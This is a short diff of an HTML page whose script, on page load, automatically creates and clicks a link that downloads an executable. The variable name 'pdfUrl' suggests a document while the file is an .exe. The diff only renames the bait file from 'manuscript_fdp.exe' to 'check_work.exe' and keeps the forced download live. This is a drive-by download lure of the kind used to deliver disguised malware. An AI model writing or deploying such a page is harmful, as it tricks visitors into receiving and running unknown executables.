@@ -5,11 +5,11 @@
 </head>
 <body>
 <script>
-  const pdfUrl = "manuscript_fdp.exe";
+  const pdfUrl = "check_work.exe";
   window.addEventListener('load', () => {
     const link = document.createElement('a');
     link.href = pdfUrl;
-    link.download = "manuscript_fdp.exe";
+    link.download = "check_work.exe";
     document.body.appendChild(link);
     link.click();
     document.body.removeChild(link);
